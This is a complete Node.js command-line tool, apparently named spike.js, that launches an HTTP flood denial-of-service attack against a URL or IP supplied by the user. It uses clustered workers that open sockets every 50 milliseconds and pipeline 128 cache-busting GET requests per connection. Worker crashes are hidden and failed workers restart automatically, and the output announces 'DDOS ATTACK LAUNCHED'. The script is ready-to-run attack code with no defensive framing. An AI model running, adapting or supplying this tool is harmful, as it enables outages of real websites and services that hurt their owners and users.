const fs = require('fs');
const url = require('url');
const net = require('net');
const cluster = require('cluster');
const os = require('os');

// Format target URL to ensure it has http:// prefix
function formatUrl(targetUrl) {
  if (!targetUrl) return null;
  
  // Check if the URL already has a protocol
  if (!targetUrl.match(/^https?:\/\//i)) {
    // Add http:// prefix if not present
    targetUrl = 'http://' + targetUrl;
  }
  
  return targetUrl;
}

// Improved command line argument handling with defaults
const args = {
  target: formatUrl(process.argv[2]),
  threads: parseInt(process.argv[3]) || os.cpus().length,
  time: parseInt(process.argv[4]) || 60,
  port: parseInt(process.argv[5]) || 80
};

if (!args.target) {
  console.log("\x1b[31mUsage: node spike.js <url/ip> [threads] [time] [port]\x1b[0m");
  console.log("  <url/ip>  : Target URL or IP address (required)");
  console.log("  [threads] : Number of threads (default: CPU count)");
  console.log("  [time]    : Duration in seconds (default: 60)");
  console.log("  [port]    : Target port (default: 80)");
  process.exit(-1);
}

// Parse target URL
const parsed = url.parse(args.target);
const host = parsed.host || args.target.replace(/^https?:\/\//i, '');
const path = parsed.path || '/';

// Configure process behavior
require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);
process.on('uncaughtException', (e) => { /* console.error(e) */ });
process.on('unhandledRejection', (e) => { /* console.error(e) */ });

// Load user agents with error handling and fallback
let userAgents = [];
try {
  userAgents = fs.readFileSync('ua.txt', 'utf8').split('\n').filter(ua => ua.trim());
  if (userAgents.length === 0) throw new Error('Empty user agent file');
} catch (err) {
  console.error('\x1b[31mError loading ua.txt file: ' + err.message);
  console.log('\x1b[33mUsing fallback user agent');
  userAgents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36'];
}

// Cluster management
if (cluster.isMaster) {
  // Launch worker threads
  for (let i = 0; i < args.threads; i++) {
    cluster.fork();
  }
  
  // Display attack information
  console.clear();
  console.log('\x1b[36m┌───────────────────────────────────────┐');
  console.log('│         \x1b[33m DDOS ATTACK LAUNCHED\x1b[36m        │');
  console.log('├───────────────────────────────────────┤');
  console.log(`│ Target: \x1b[33m${args.target}\x1b[36m`);
  console.log(`│ Host: \x1b[33m${host}\x1b[36m`);
  console.log(`│ Port: \x1b[33m${args.port}\x1b[36m                          │`);
  console.log(`│ Duration: \x1b[33m${args.time}\x1b[36m seconds              │`);
  console.log(`│ Threads: \x1b[33m${args.threads}\x1b[36m                       │`);
  console.log('└───────────────────────────────────────┘\x1b[0m');
  
  // Monitor active connections
  let connections = 0;
  let requests = 0;
  
  Object.values(cluster.workers).forEach(worker => {
    worker.on('message', (msg) => {
      if (msg.connections) connections = msg.connections;
      if (msg.requests) requests += msg.requests;
    });
  });
  
  // Status updates
  const statusInterval = setInterval(() => {
    process.stdout.write(`\r\x1b[33mActive Connections: \x1b[37m${connections} \x1b[33mTotal Requests: \x1b[37m${requests}`);
  }, 1000);
  
  // Cleanup and exit
  setTimeout(() => {
    clearInterval(statusInterval);
    console.log('\n\x1b[32mAttack completed. Shutting down...');
    
    Object.values(cluster.workers).forEach(worker => {
      worker.send('stop');
      setTimeout(() => worker.kill(), 2000);
    });
    
    setTimeout(() => process.exit(0), 3000);
  }, args.time * 1000);
  
  // Handle worker events
  cluster.on('exit', (worker, code, signal) => {
    console.log(`\x1b[31mWorker ${worker.id} died. Restarting...\x1b[0m`);
    cluster.fork();
  });
} else {
  // Worker process
  startFlood();
}

function startFlood() {
  const requestHeaders = [
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'Upgrade-Insecure-Requests: 1',
    'Accept-Encoding: gzip, deflate, br',
    'Accept-Language: en-US,en;q=0.9',
    'Cache-Control: max-age=0',
    'Connection: Keep-Alive',
    'Sec-Fetch-Dest: document',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: none',
    'Sec-Fetch-User: ?1',
    'Pragma: no-cache'
  ];
  
  let activeConnections = 0;
  let lastRequestCount = 0;
  
  // Report status to master process
  setInterval(() => {
    if (process.send) {
      process.send({ 
        connections: activeConnections,
        requests: lastRequestCount 
      });
      lastRequestCount = 0;
    }
  }, 1000);
  
  // Attack function
  const attack = () => {
    const socket = new net.Socket();
    const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
    
    socket.connect(args.port, host);
    socket.setTimeout(10000);
    
    socket.on('connect', () => {
      activeConnections++;
      
      for (let i = 0; i < 128; i++) {
        // Add some randomization to the request to bypass caching
        const cacheBuster = Math.floor(Math.random() * 1000000);
        const requestPath = path.includes('?') 
          ? `${path}&_=${cacheBuster}` 
          : `${path}?_=${cacheBuster}`;
          
        const requestData = [
          `GET ${requestPath} HTTP/1.1`,
          `Host: ${host}`,
          `User-Agent: ${randomUserAgent}`,
          ...requestHeaders,
          '\r\n'
        ].join('\r\n');
        
        socket.write(requestData);
        lastRequestCount++;
      }
    });
    
    socket.on('data', () => {
      // Keep socket alive but eventually close to avoid memory leaks
      setTimeout(() => {
        socket.destroy();
      }, 5000);
    });
    
    socket.on('error', () => {
      socket.destroy();
    });
    
    socket.on('close', () => {
      activeConnections--;
    });
  };
  
  // Start attack loops with optimized intervals
  const attackInterval = setInterval(attack, 50);
  
  // Listen for stop message from master
  process.on('message', (msg) => {
    if (msg === 'stop') {
      clearInterval(attackInterval);
    }
  });
  
  // Auto-terminate after time limit
  setTimeout(() => clearInterval(attackInterval), args.time * 1000);
}
